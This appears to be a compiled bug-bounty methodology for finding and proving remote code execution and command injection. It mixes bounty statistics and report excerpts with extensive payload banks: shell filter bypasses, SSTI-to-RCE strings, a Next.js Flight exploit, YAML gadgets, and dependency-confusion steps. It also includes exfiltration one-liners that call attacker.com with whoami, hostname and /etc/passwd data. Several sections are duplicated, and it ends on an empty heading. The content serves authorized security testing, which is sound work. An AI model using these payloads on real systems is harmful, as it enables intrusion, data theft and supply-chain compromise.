# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Map sinks: shell exec, eval, template render, image/PDF converters, archive tools, CI runners.
- Use time-based and OOB callbacks, not just output reflection.
- Test argument injection on tools that take filenames/URLs (curl, ffmpeg, git, ImageMagick).
- Check upload -> processing chains (SVG, image, office, archive).
- Look at admin/debug endpoints and internal tooling exposed to users.

### Deeper checklist

- Map sinks: shell exec, eval, template render, image/PDF converters, archive tools, CI runners.
- Test command injection with time-based and OOB callbacks, not just output reflection.
- Try argument injection on tools that accept filenames/URLs (curl, ffmpeg, git, imagemagick).
- Check file upload + processing chains (SVG, image, office, archive) for code paths.
- Test expression languages, spreadsheet formulas, and template engines.
- Look at admin/debug endpoints and internal tooling exposed to users.
- Escalate from injection to a clear impact: command output, file read, or callback.

### Autonomous Testing Priority

**Content-type is the #1 silent failure mode for command injection.**

Traditional web forms use `Content-Type: application/x-www-form-urlencoded`. If you send a JSON body (`{"host":"127.0.0.1;id"}`) to a form endpoint, the server reads `request.form['host']` and gets nothing — the app executes normally with no injection, returning a plausible 200 response. You get a false negative with no indication anything went wrong.

**Rule:** If the page has an HTML form (`<form method="POST">`), use form-encoding. If the path is `/api/...` or the response is JSON, use JSON.

**Command injection operators to try (in order of prevalence):**
```
value;id        ← Unix semicolon (most common)
value|id        ← pipe
value&&id       ← AND
value$(id)      ← subshell
value`id`       ← backtick
```

**Proof:** OS command output (`uid=N(username) gid=...`) in the response body confirms code execution. The output may be HTML-wrapped — that still counts. If the response is otherwise normal (200, expected content) with the command output appended or embedded, exploitation is confirmed.

---

### Step-by-Step Hunting Methodology

1. **Map the execution contexts first.** Before testing payloads, identify everywhere user-controlled input touches an execution layer: template engines, shell commands, YAML parsers, file paths used in operations, package resolution, and configuration files.

2. **Enumerate admin/management interfaces.** Crawl for `/management-console`, `/admin`, `/_internal`, `/setup`, `/config`. These surfaces are lower-auth and higher-privilege — the GHES cluster produced 6 separate RCEs from one console role.

3. **Check template injection in every config field.** In any management UI that accepts free-form configuration (log destinations, notification formats, proxy settings), submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. Look for `49` in responses, logs, or DNS callbacks.

4. **Test YAML/XML/serialized input for code execution.** Any endpoint accepting `Content-Type: application/yaml` or `application/xml`:
   - SnakeYAML: submit `!!javax.script.ScriptEngineManager` gadget
   - Ruby YAML: submit `!ruby/object:Gem::Installer` gadget
   - REXML: submit billion-laughs / quadratic blowup XML

5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos — register a higher-versioned package on the public registry pointing to a canary callback.

6. **Check file path operations for traversal → execution.** ActiveStorage, file upload handlers, symlink operations: submit `../../../etc/cron.d/shell` as filename. Confirm write then trigger execution.

7. **Audit Kubernetes/cloud-native surfaces.** Run `kubectl` against any exposed API server. Check ingress annotations, especially `nginx.ingress.kubernetes.io/configuration-snippet` and `spec.rules.http.paths.path` for Lua/regex injection.

8. **Test OAuth redirect URI and URL scheme handlers.** Mobile apps processing `javascript:` or `intent://` URIs via OAuth redirect may execute JavaScript. Try `javascript:alert(document.cookie)` and custom scheme URIs.

9. **Verify with out-of-band callbacks.** Never rely solely on visible output. Use Burp Collaborator, interactsh, or `canarytokens.org` DNS tokens. Blind RCE is common in backend processors.

10. **Chain privileges.** A low-severity misconfiguration (editor role, CSRF, path traversal) combined with an RCE primitive equals critical. Always ask: "what can I reach from here?"

---

### A. Discovery checklist — concrete artifacts, endpoints, patterns, tools to look for

- **OWASP A05:2025 Injection** is the home category (CWE-77/78 command, CWE-88 argument, CWE-1336 SSTI). Injection is 100% covered by tested apps and has the most CVEs of any category — treat every interpreter-facing input as a candidate.
- **Classic command-injection sinks:** network diagnostics (`ping`, `host`, `nslookup`, `traceroute`), converters (`convert`, `zip`, `ffmpeg`, `exiftool`), mail (`mail -s`), PDF generators, backup/maintenance forms, search, and CGI/admin wrappers. Trace *filenames* and header values (`X-Forwarded-For`) into the command string, not just visible form fields.
- **Top 25 RCE-flavoured parameters (trbughunters):** `cmd`, `exec`, `command`, `execute`, `ping`, `query`, `jump`, `code`, `reg`, `do`, `func`, `arg`, `option`, `load`, `process`, `step`, `read`, `function`, `req`, `feature`, `exe`, `module`, `payload`, `run`, `print`.
- **Dangerous APIs by language (OWASP WSTG INPV-12):** Java `Runtime.exec()`; C/C++ `system/exec/ShellExecute`; Python `exec/eval/os.system/os.popen/subprocess.Popen`; PHP `system/shell_exec/exec/proc_open/eval/passthru`; Node `child_process.exec/execSync/spawn`; Ruby `system/exec/Open3.popen3`; Go `exec.Command`; C# `Process.Start`.
- **Argument/option injection (no shell needed):** any value beginning `-`/`--` passed via `execve`/`execFile` to `curl` (`-o /path`, `-K <url>`), `ping` (`-f`, `-c 100000`), `tcpdump` (`-G 1 -W 1 -z /path/script.sh`), ExifTool (`-if` with Perl expressions, newline-delimited argument smuggling via JSON keys). Watch `--` end-of-options mitigations placed in the wrong position.
- **Second-order / asynchronous sinks:** stored email addresses or filenames later consumed by a GPG key test or converter; log-poisoning where a privileged job later `grep|sed|awk`s a log into a backtick `find` command; JVM argument injection (`_JAVA_OPTIONS`, `AdditionalJavaArguments`) turned into `-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="<cmd>"`.
- **SSTI detection:** `{{7*7}}`→49, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`; engines Jinja2, Twig/Blade, FreeMarker/Velocity, ERB, Mako, Groovy, Razor. Code-context injection discovered by closing the statement (`}}SSTI`).
- **Deserialization sinks:** Java `ObjectInputStream.readObject`, PHP `unserialize()`, Python `pickle.load`, .NET `BinaryFormatter.Deserialize`, Ruby `Marshal.load`, Node `node-serialize`; native formats (JSON is safe by design).
- **Tooling:** `commix`, `Bashfuscator`, `Invoke-DOSfuscation`, PortSwigger `SHELLING`/Command Injection Attacker (payload generator with time/DNS/filesystem feedback channels and payload marking), `ysoserial`/`ysoserial.net`/`phpggc`, `frida` for mobile-to-`Runtime.exec` pivots, Semgrep taint rules for white-box confirmation, `react2shell-scanner` for Next.js Flight RCE.

## Signals and surfaces

### Signal

- Reports: **1,399** · paid: **338**
- Median bounty **$800** · p90 **$8,000** · max **$33,510** · total **$888,597**
- Median upvotes **11**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 38 | $179,420 | 5024 |
| shopify-scripts | 85 | $173,800 | 632 |
| Internet Bug Bounty | 129 | $98,057 | 2062 |
| Pornhub | 8 | $43,600 | 1008 |
| PayPal | 2 | $39,700 | 1797 |
| Uber | 18 | $32,000 | 816 |
| Mail.ru | 34 | $27,450 | 1686 |
| X / xAI | 20 | $26,180 | 2306 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`cmd` `exec` `command` `run` `eval` `template` `import` `convert` `render` `filename` `url`

### Crown Jewel Targets

RCE vulnerabilities command the highest payouts in bug bounty programs because they grant attackers direct execution control over target infrastructure. The highest-value targets are:

**Highest-paying asset types:**
- **Enterprise server products** (GitHub Enterprise Server, self-hosted GitLab) — privilege escalation chains from low-privileged console roles to root SSH access consistently pay critical/high
- **Supply chain / package registries** — dependency confusion attacks against npm, PyPI, etc. hit critical severity across every major program
- **Cloud-native infrastructure** — exposed Kubernetes API servers, ingress controllers, and misconfiqured CI/CD pipelines
- **Mobile app backends and OAuth flows** — where server-side processing of attacker-controlled data meets execution contexts
- **Admin/management consoles** — template injection in configuration panels reaches root with a single payload

**Why this class pays most:**
- Blast radius is infrastructure-wide, not user-scoped
- Proof-of-concept is unambiguous — shell output is undeniable
- Fix requires architectural changes, not just a patch
- Programs cannot afford false negatives on RCE

---

### Response Headers / Tech Stack Signals

```
X-Powered-By: Express          # Node.js — npm dependency surface
X-Powered-By: Phusion Passenger
Server: nginx (ingress-nginx)  # Kubernetes ingress — path field injection
X-Runtime: Ruby                # Rails ActiveStorage, RDoc, REXML attack surface
Content-Type: application/yaml # YAML parsers (SnakeYAML, Psych) — deserialization
X-GitHub-Enterprise-Version    # GHAS — nomad template, collectd, syslog-ng injection
```

### JavaScript / Frontend Signals

```javascript
// Look for these patterns in JS bundles
fetch('/api/exec', {method:'POST', body: cmd})
eval(userInput)
new Function(userInput)
document.write(unsafeData)
window.location = userControlled  // URL scheme bypass → JS execution
```

### Tech Stack Signals

| Signal | RCE Vector |
|--------|-----------|
| `nomad` in config UI | Template injection → `{{ ... }}` |
| `syslog-ng` config editable | Config injection → `program()` destination |
| `collectd` config editable | Plugin exec injection |
| `SnakeYAML` in classpath | `!!javax.script.ScriptEngineManager [...]` |
| npm `package.json` internal scope | Dependency confusion |
| ingress-nginx annotations | Path field regex bypass |

---

## Techniques, payloads and bypasses

### Payloads & probes

- Shell -> `;id`, `|id`, `$(id)`, backticks, `%0aid`, newline injection
- Argument -> `--output=/tmp/x`, `-o`, `--config`, `file://`
- Expression -> `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`
- Log4j -> `${jndi:ldap://callback/a}`
- ImageMagick -> `push graphic-context` / `fill 'url(https://callback/x)'`

### Payload bank

**53 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Space / filter bypass

```text
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
c\at /etc/passwd
c'a't /etc/passwd
/bin/cat$IFS/etc/passwd
$(printf '\x69\x64')
echo${IFS}aWQ=|base64${IFS}-d|sh
id%09
id%0a
;id;#
|id|
```

### Bypass tricks

- Blind via DNS/HTTP callback; encode spaces as `${IFS}`, `%09`, `$()`.
- Bypass blocklists with base64, wildcards, quotes, and environment variables.
- Use file-write + include, or log poisoning, when direct exec is blocked.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Potential pre-auth RCE on Twitter VPN** — `#591295` · X / xAI · $20,160 · ▲1246
  > For security concern, we didn't attach the `mtmp/system` and the `dataa/data.mdb`.
- **Exposed Kubernetes API - RCE/Exposed Creds** — `#455645` · Snapchat · $25,000 · ▲1191
  > During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public.
- **RCE via npm misconfig -- installing internal libraries from the public registry** — `#925585` · PayPal · $30,000 · ▲946
  > [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610?sk=991ef9a180558d25c5c6bc5081c99089)
- **DoS on PayPal via web cache poisoning** — `#622122` · PayPal · $9,700 · ▲851
  > On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'.
- **H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products** — `#422944` · Shopify · $0 · ▲830
  > When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on `██████████:8080`:
- **Remote Code Execution on www.semrush.com/my_reports on Logo upload** — `#403417` · Semrush · $0 · ▲824
  > Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2
- **Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application** — `#873614` · PlayStation · $15,000 · ▲780
  > After opening the initial URL at `https://psnow.playstation.com/app/1.10.43/105/00d3603f8/` we can see the `Connection: Upgrade` request to this server from `psnow.playstation.com`.
- **Git flag injection - local file overwrite to remote code execution** — `#658013` · GitLab · $12,000 · ▲777
  > The `wiki blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional flags to be injected into the git command.
- **Webshell via File Upload on ecjobs.starbucks.com.cn** — `#506646` · Starbucks · $0 · ▲688
  > I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.
- **RCE and Complete Server Takeover of http://www.█████.starbucks.com.sg/** — `#502758` · Starbucks · $0 · ▲572
  > One twist was that since I needed to bypass the local proxy, instead of attacking `/web-console`, I had to send all requests to `/josso/%5C../web-console`.
- **Privilege Escalation From user to SYSTEM via unauthenticated command execution** — `#544928` · Ubiquiti Inc. · $0 · ▲553
  > Since the evostream service is running as SYSTEM a user can use the launchprocess command, http://docs.evostream.com/2.0/launchProcess.html, to execute any binary with supplied arguments.
- **BAD Code !** — `#180074` · Paragon Initiative Enterprises · $0 · ▲549
  > Anyway, I've found that your code here https://github.com/paragonie/airship/blob/master/tools/audit helper.php , is starting with <?php and it should be with ? ...
- **Local files could be overwritten in GitLab, leading to remote command execution** — `#587854` · GitLab · $12,000 · ▲542
  > Suppose we have a repository which has only one file `id ed25519.pub` (contains my pubkey) in directory `--output=/var/opt/gitlab/.ssh/authorized keys/`.
- **Remote Code Execution in Slack desktop apps + bonus** — `#783877` · Slack · $0 · ▲509
  > banned `iframe`, `applet`, `meta`, `script`, `form` etc.
- **RCE when removing metadata with ExifTool** — `#1154542` · GitLab · $20,000 · ▲508
  > When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go L104) through to [ExifTool](https://exiftool.org/) to remove any…
- **profile-picture name parameter with large value lead to DoS for other users and programs on the platform** — `#764434` · HackerOne · $0 · ▲475
  > Add the payload text (attached with report payload.txt) at the starting of the filename in the above request e.g `<payload abcd.png`
- **RCE via unsafe inline Kramdown options when rendering certain Wiki pages** — `#1125425` · GitLab · $20,000 · ▲427
  > As both `require relative` and `require` allow for directory traversal, supplying a `driver` option such as `../../../../../../../../../../tmp/a.rb` will cause that file to be evaluated.
- **Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message** — `#631956` · Valve · $0 · ▲420
  > So we tried a simple payload `disconnect "<img src='https://i.imgur.com/IbJKM0M.jpg' "`, and after running it twice (for caching purposes), the cat appeared to our surprise.
- **Remote code execution on Basecamp.com** — `#365271` · Basecamp · $5,000 · ▲417
  > /Proof of concept/: Upload the attached rce.gif file as profile image (change the `ping -c1 attacker.com' to some other shell command).
- **H1514 Server Side Template Injection in Return Magic email templates?** — `#423541` · Shopify · $0 · ▲409
  > `{{ this. proto .constructor.name }}` -- `Object`
- **Denial of service to WP-JSON API by cache poisoning the CORS allow origin header** — `#591302` · Automattic · $0 · ▲405
  > The WP-JSON implementation on some wordpress.com websites I've tested is vulnerable to denial of service where by an attacker can provide an arbitrary `Origin` header in the request, which is then echoed back in the response via the…
- **Remote Command Execution via Github import** — `#1679624` · GitLab · $33,510 · ▲392
  > run `curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: gitlab session=gggg'` replacing `gitlab.wbowling.info` with your gitlab url and `gggg` with the string you used in `gen payload3.rb`
- **RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)** — `#1609965` · GitLab · $33,510 · ▲387
  > Most of the places I've checked do not allow you to set the `import source` for a project, or have the `import type` set to something other than `gitlab project` or `gitlab custom project template` (which is required to use the…
- **RCE on build server via misconfigured pip install** — `#946409` · Yelp · $0 · ▲366
  > Whenever `yelp-cgeom` is installed, my `setup.py` script is executed on the machine where it is downloaded.
- **Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)** — `#3782701` · Mozilla · $12,000 · ▲361
  > The anonymous role has the required scopes. On `firefox-ci-tc` the `anonymous` role grants `auth:expand-scopes`, `auth:list-roles`, `auth:current-scopes`, and `hooks:list-hooks: `.
- **Arbitrary file read via ffmpeg HLS parser at https://www.flickr.com/photos/upload** — `#487008` · Flickr · $0 · ▲340
  > 3.Now go to https://www.flickr.com/cameraroll and you should be able to see contents of /etc/passwd.
- **[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable** — `#210779` · X / xAI · $0 · ▲323
  > According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token
- **Code injection possible with malformed Nextcloud Talk chat commands** — `#851807` · Nextcloud · $0 · ▲317
  > For example, /wiki cannot show the results of `cat /etc/passwd` because the multiline output breaks the wiki script, but the [calculator sample](https://nextcloud-talk.readthedocs.io/en/latest/commands/ create-pathtocalcsh) can show the output because it has…
- **RCE on TikTok Ads Portal** — `#1024575` · TikTok · $0 · ▲312
  > The video upload endpoint on the TikTok Ads portal was potentially susceptible to remote code execution (RCE) due to a ffmpeg misconfiguration.
- **RCE via github import** — `#1672388` · GitLab · $0 · ▲271
  > - Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR IP YOUR PORT` in which, you should replace `IP` and `PORT` with the one you have.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 7× | `$where` |
| 5× | `SFORMAT()` |
| 4× | `https://twitter.com/{username}/moments` |
| 4× | `<img>` |
| 4× | `..;/` |
| 4× | `requestOCSP()` |
| 4× | `loadSession()` |
| 4× | `VM.doCODESIZE()` |
| 4× | `discover()` |
| 4× | `%00` |
| 3× | `eval()` |
| 3× | `OsCommand.writeJson()` |
| 3× | `$templates` |
| 3× | `<local_file_path>` |
| 3× | `<webview>` |
| 3× | `loadSNI()` |
| 3× | `<div>` |
| 3× | `$GITHUB_TOKEN` |
| 3× | `install_packages()` |
| 3× | `=cmd\\|' /C calc'!A0` |

### Common Root Causes

**1. Configuration-as-code with insufficient sanitization**
Administrators edit configuration files (syslog-ng, collectd, nomad) through web UIs. Developers assume admin == trusted, so they pass field values directly into config files that support execution primitives (`program()` destinations, exec plugins, template functions).

**2. Template engines in privileged contexts**
Go's `text/template`, Freemarker, Velocity, and Twig are used for system configuration rendering. When user-controlled strings reach these engines without sandboxing, arbitrary code follows.

**3. Dependency confusion / namespace squatting**
Internal packages published to private registries without locking the public registry namespace. Build systems that prefer public registries by default, or that fall through to public when the private registry lacks a package.

**4. Unsafe deserialization of YAML/XML**
Developers use `YAML.load()` without safe loaders, or `new Yaml()` (SnakeYAML) without type restrictions. Ruby's `YAML.load` and Java's SnakeYAML both support arbitrary object instantiation by default.

**5. Path traversal in file operation chains**
Filenames accepted from user input are used in filesystem operations without normalization. Rails ActiveStorage, file upload handlers, and rdoc generators trust the `filename` parameter.

**6. Assuming low-privilege roles can't reach execution contexts**
The GHES management console granted "Editor" roles access to configuration fields that touched shell execution. Developers assumed privilege boundaries existed at a higher architectural level.

**7. Missing input validation on infrastructure-facing fields**
Ingress/nginx annotation values, Kubernetes spec fields, and webhook URLs are treated as opaque strings — but the downstream processor (nginx config generator, regex engine) interprets them as code.

---

### Operator-level pattern

Every modern RCE chain has two halves: **the bytes get there** (SSRF, SQLi, upload, prototype-pollution, ViewState, XXE) and **the bytes get interpreted** (lambda invoke, COPY PROGRAM, webshell handler, child_process.spawn, deserializer gadget, expect://). Hunt for the first half; the second is usually one of the six above. If your first-half primitive doesn't compose with any of these — pause before submitting. "Could lead to RCE" is Low/Medium; "RCE demonstrated end-to-end" is Critical.

Cross-references:
- `ssrf` — Chain 1
- `sqli` — Chain 2
- `file-upload` — Chain 3
- `api-misconfig` (proto-pollution) — Chain 4
- `sharepoint` + `aspnet` — Chain 5
- `xxe` — Chain 6

---

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Direct/in-band proof:** append `;id`, `|id`, `&&id`, `||id`, or `%0A id` (newline, recommended by HackTricks) and look for `uid=` in the response. Break out of a quoted context first with `"`/`'`. Unix-only: backticks `` `id` ``, `$(id)`, `${IFS}` to synthesize spaces, `ls${LS_COLORS:10:1}${IFS}id`.
- **Blind time delay:** `& ping -c 10 127.0.0.1 &` (10s), `; sleep 10;`, `|| ping -c 10 127.0.0.1 ||`. Character-by-character exfiltration: `time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi` — a 5s delay confirms the character.
- **Output redirection:** `& whoami > /var/www/static/whoami.txt &` then fetch `/whoami.txt`; PortSwigger's lab uses `email=||whoami>/var/www/images/output.txt||` and retrieves via the image `filename` parameter.
- **OOB / OAST (most reliable for blind and *asynchronous* injection):** `email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||` — the username appears in the DNS subdomain. `;curl http://<collab>/cmdi-test` or `%3Bcurl+http://LHOST:LPORT/$(whoami)` confirms both execution and effective user. Poll Collaborator repeatedly — async commands fire after the HTTP response. DNS exfil: `for i in $(ls /); do host "$i.<dnsbin-subdomain>"` or `$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').collab)`.
- **Windows payloads:** `& whoami &`, `| ver |`, `powershell C:\**2\n??e*d.*?` (wildcard `calc`), `@^p^o^w^e^r^shell c:\**32\c*?c.e?e`, and `%0A` newline; Linux `sleep`/`curl` do not apply.
- **Filter/allowlist bypasses:** numeric-prefix validation is not a shell guard — `saml_id=1%26http://$(whoami)` retains the integer then uses URL-encoded `&` + substitution. Bash arithmetic contexts re-tokenize: `st=theValue&h=gPath['sleep 5']` reaches `[[ ... -gt ${gStartTime} ]]` and executes (Ivanti EPMM pattern). Stored email local part: ``a`touch${IFS}/tmp/proof`@attacker.example`` bypasses space filtering (Savane pattern).
- **Node.js distinction:** `exec()` spawns `/bin/sh -c` (injectable); `execFile()`/`spawn()` with an argument array is safe from *shell* injection but still vulnerable to leading-hyphen option injection. Synology Photos Pwn2Own 2024 placed attacker data into an `exec()` template string via an unauthenticated WebSocket event.
- **SSTI to RCE (quote-free, plugin-free):** Jinja2 `{{self.__init__.__globals__.__str__()[1786:1788]}}` to build strings by index; Mako `${str().join(chr(i) for i in [105,100])}`; Twig/PHP `{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}` → `id` (BeyondTrust CVE-2025-5309). Sandbox escapes are a severe class (USENIX 2023 TEFuzz research).
- **React2Shell / Next.js Flight (CVE-2025-55182):** `{"then":"$1:__proto__:then","_response":{"_prefix":"require('child_process').exec('id')","_formData":{"get":"$1:constructor:constructor"}}}`; remote oracle `500` + `E{"digest"` on malformed Flight payloads (`react2shell-scanner --safe-check`).
- **Deserialization:** reach ysoserial gadget chains once a native-format sink is confirmed; .NET ViewState via recovered `machineKey`; PHP `phar://` metadata; use `ObjectInputFilter` allowlists as the defensive reference point.

### Bypass: Shell metacharacter filtering

```bash
# Blocked: ; | & ` $()
# Bypass using $IFS and encodings
cat${IFS}/etc/passwd
{cat,/etc/passwd}
$'\x63\x61\x74' /etc/passwd  # hex encoding
$(printf '\x63\x61\x74') /etc/passwd

# Newline injection when semicolons blocked
payload=$'\ncurl attacker.com\n'
```

### Bypass: URL scheme allowlist (javascript: blocked)

```
# Mobile apps often block javascript: but miss:
jAvAsCrIpT:alert(1)          # case variation
javascript&#58;alert(1)      # HTML entity
javascript:void(alert(1))    # void wrapper
intent://attacker.com#Intent;scheme=javascript;...
data:text/html,<script>alert(1)</script>
```

### Bypass: YAML safe_load / type restrictions

```yaml
# If !!java.* is blocked, try legitimate classes with side effects
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: 'ldap://attacker.com/a'
  autoCommit: true
# Or find allowlisted types with dangerous constructors
```

### Bypass: npm scope restrictions

```
# If @company/* is monitored, look for unscoped internal names
# e.g., "internal-utils" instead of "@company/internal-utils"
# Public registries serve unscoped packages first
```

### Bypass: Path traversal filters

```
# Basic filter bypass
../           → ..%2F → %2e%2e%2f → ....// 
# Double encoding
%252e%252e%252f
# Unicode normalization
..%c0%af  (overlong UTF-8)
# Null byte (older systems)
../../etc/passwd%00.jpg
```

### Bypass: Template injection with output filtering

```
# If {{ }} is sanitized on output but not evaluation:
{% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}
# Blind — use DNS callback instead of output
{{ lipsum.__globals__.os.popen('nslookup $(id).attacker.com').read() }}
```

### Bypass: WAF blocking `exec`, `system`, `popen`

```ruby
# Ruby
send(:system, "id")
method(:exec).call("id")
Kernel.send(:`, "id")
Object.const_get(:Kernel).system("id")
```

---

### Operator-level pattern

Every modern RCE chain has two halves: **the bytes get there** (SSRF, SQLi, upload, prototype-pollution, ViewState, XXE) and **the bytes get interpreted** (lambda invoke, COPY PROGRAM, webshell handler, child_process.spawn, deserializer gadget, expect://). Hunt for the first half; the second is usually one of the six above. If your first-half primitive doesn't compose with any of these — pause before submitting. "Could lead to RCE" is Low/Medium; "RCE demonstrated end-to-end" is Critical.

Cross-references:
- `hunt-ssrf` — Chain 1
- `hunt-sqli` — Chain 2
- `hunt-file-upload` — Chain 3
- `hunt-api-misconfig` (proto-pollution) — Chain 4
- `hunt-sharepoint` + `hunt-aspnet` — Chain 5
- `hunt-xxe` — Chain 6

---

## Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

Before writing the report, confirm all three:

**1. What can the attacker DO right now?**
You must be able to demonstrate one of: execute `id`/`whoami` and capture the output, make a DNS/HTTP callback from the target server to your controlled host, write a file to the filesystem, or read `/etc/passwd`. "Might be able to" fails this gate.

**2. What does the victim LOSE?**
Articulate the concrete impact: source code exfiltration, credential theft (database, API keys, cloud IAM), lateral movement to internal network, supply chain compromise of downstream users, data destruction. Generic "attacker gains RCE" fails — name the crown jewels at risk.

**3. Can it be reproduced in 10 minutes from scratch?**
Write the reproduction steps before submitting. If you need more than: (a) a Burp request, (b) a payload file, and (c) a listener — simplify it. If reproduction requires a specific race condition, timing, or ephemeral state, document the exact conditions. Triagers who can't reproduce in one attempt will downgrade or close the report.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Three detection tiers, most reliable first:** OOB callback > time delay > in-band output. Time-based misses asynchronous execution; in-band output misses blind sinks. Use `SHELLING` payload marking to trace which payload produced a result.
- **Prove execution, not just parsing:** a reflected `uid=` string, an `id`-labelled DNS callback, or `whoami` file contents with a unique marker. A 500 error or a generic "command failed" is not RCE.
- **Parent process behaviour matters:** a WAF/logging pipeline that only inspects response bodies misses blind injection entirely — confirm with an out-of-band interaction, not a status code.
- **Distinguish command injection from argument injection** (leading hyphen) and from code injection (`eval`/template) — mitigation and reporting differ; `execFile` removing the shell does not remove option-injection risk.
- **Second-order chains require full path tracing:** from unauthenticated log writer → scheduled reader → later shell sink; an immediate HTTP response is not proof. The same applies to stored email/filename values consumed by later admin actions.
- **Deserialization gate:** a serialized blob that is parsed-and-reserialized (removing the carrier) is not exploitable — confirm the original text survives to a shell/render sink.
- **Pre-Severity Gate:** a file-write-only primitive with no execution path is not RCE; a sandboxed eval that cannot reach `os` is at most Medium SSTI. Pinning down the effective user (`whoami`) and OS (`uname -a`/`ver`) is part of the proof and the impact statement.
- **Source-code review is the best method** for finding injection (OWASP); SAST flags `system()/exec()/popen()/shell_exec()` with tainted input but cannot find runtime-only flows — pair with DAST/OAST.

- **Escalation ladder after confirmation:** `whoami` → `uname -a`/`ver` → `ifconfig`/`ipconfig /all` → `netstat -an` → `ps -ef`/`tasklist` (PortSwigger's initial command set), then decide between local privilege escalation and lateral movement — all with a unique marker to keep the PoC attributable.
- **Attachment-injection variants worth a dedicated pass:** uploaded filename reaching an `odt2spip`/converter command (SPIP), PEM explanatory text (`$(...)` preamble before a `BEGIN` line, RFC 7468) surviving into a shell-backed `openssl` call (Cisco SSM "Dirty Cert"), and relative-path executable selection (`../Windows/System32/cmd` in PaperCut Scan-to-Fax).
- **Rule engines and scripting as RCE:** admin "rule" editors that evaluate PHP can become full RCE if `runkit` is enabled (`runkit_function_redefine('checkBid', ..., 'system($_GET["cmd"])')`); printer/scripting consoles (PaperCut) and Jenkins script console are the same class behind a different UI.
- **WAF evasion is not proof:** OWASP ModSecurity CRS flags shell metacharacters and `whoami`/`cat /etc/passwd`/`nslookup`, but encoding/case variation bypasses rules — treat a bypass as a signal, then prove execution with OOB.
- **SOC-side indicators to align the report with:** web-server processes spawning `bash`/`sh`/`cmd.exe`/`powershell`, unexpected `execve()`/`system()` calls from the app process, and outbound connections from application processes — these strengthen the impact statement for enterprise clients.
- **Source-review triage for white-box engagements:** flag string concatenation into `system()`/`exec()`/`proc_open()`/`Runtime.exec()`/`child_process.exec()`; prefer `execFile`/`spawn` with argument arrays and `escapeshellarg`-style quoting as the recommended fix (OWASP OS Command Injection Defense cheat sheet).
- **Deserialization → RCE chain discipline:** match the language to the gadget set (ysoserial Java, ysoserial.net .NET, phpggc PHP, pickle `__reduce__` Python, `phar://` metadata); a blob that is only parsed-and-reserialized is not exploitable.
- **SSTI sandbox caveat:** a working `{{7*7}}` does not guarantee RCE — modern engines sandbox template escape; demonstrate the escape (class walker / callback registrar) or downgrade to SSTI rather than claiming Critical.
- **Rate-limit/blind-timing caveat:** time-based probes can be drowned by asynchronous execution or variable backend load — require a statistically clear delay delta (or move to OOB) and repeat before concluding.

### Out-of-Band RCE Confirmation

```bash
# Payload to confirm blind RCE via DNS
curl "http://$(id | base64).YOUR-INTERACTSH-URL/"
nslookup $(whoami).attacker.com
wget http://attacker.com/$(cat /etc/hostname)
```

## Escalation and related chains

### Escalation chains

- RCE -> cloud creds -> lateral movement.
- Upload + parser -> RCE.
- SSTI -> RCE.

### Chains & Compositions (Senior Hunting)

